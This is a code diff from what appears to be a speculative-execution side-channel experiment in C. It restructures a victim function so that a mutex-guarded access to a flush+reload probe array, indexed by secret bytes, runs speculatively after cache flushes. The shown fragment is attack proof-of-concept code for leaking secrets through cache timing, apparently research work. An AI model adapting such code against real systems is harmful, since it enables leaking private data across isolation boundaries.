@@ -23,8 +23,9 @@
 
 cp_t* flush_reload_arr;
 
-extern inline void attack_func(pthread_mutex_t* lock_ptr, int secret_index) {
-    pthread_mutex_lock(lock_ptr);
+void attack_func(pthread_mutex_t* lock_ptr, int secret_index) {
+    if(pthread_mutex_trylock(lock_ptr) != 0) return;
+
     volatile cp_t cp = flush_reload_arr[SECRET[secret_index]];
     pthread_mutex_unlock(lock_ptr);
 }
@@ -45,29 +46,22 @@ void victim_func(int lock_index, int secret_index) {
     klm_addresses[l_idx] = &l;
     klm_addresses[m_idx] = &m;
 
-    //array that tracks which locks are locked. Default value is false.
-    char locked[n_locks] __attribute__ ((aligned (256)));
-    for(int i = 0; i < n_locks; i++) locked[i] = false;
-
     //lock either k,l or m, depending on the parameter. Branch predictor cannot determine which (no branches).
     pthread_mutex_t* klm_address = klm_addresses[lock_index];
     pthread_mutex_lock(klm_address);
-    locked[lock_index] = true;
+    //[lock_index] = true;
 
     //Remove locked[k_idx] from cache, so that the branch will speculatively execute.
     cpuid();
-    flush((void*)&locked[k_idx]);
     flush((void*)klm_addresses[k_idx]);
     cpuid();
 
-    if(!locked[k_idx]) {
-        //volatile cp_t cp1 = flush_reload_arr[0];
-        pthread_mutex_lock(&k); //TODO: check if this works normally, otherwise configure
-        volatile cp_t cp = flush_reload_arr[SECRET[secret_index]];
-        //attack_func(&k, secret_index);
-        cpuid();
-        pthread_mutex_unlock(&k);
-    }
+
+    attack_func(&k, secret_index);
+    /*pthread_mutex_lock(&k); //TODO: check if this works normally, otherwise configure
+    volatile cp_t cp = flush_reload_arr[SECRET[secret_index]];
+    pthread_mutex_unlock(&k);//*/
+
 
     cpuid();
 
@@ -75,10 +69,6 @@ void victim_func(int lock_index, int secret_index) {
     pthread_mutex_destroy(&k);
     pthread_mutex_destroy(&l);
     pthread_mutex_destroy(&m);
-    /*if(!locked[k_idx]) pthread_mutex_unlock(&k);
-    if(!locked[l_idx]) pthread_mutex_unlock(&l);
-    if(!locked[m_idx]) pthread_mutex_unlock(&m);*/
-
 }
 
 int* prepare(int secret_index) {
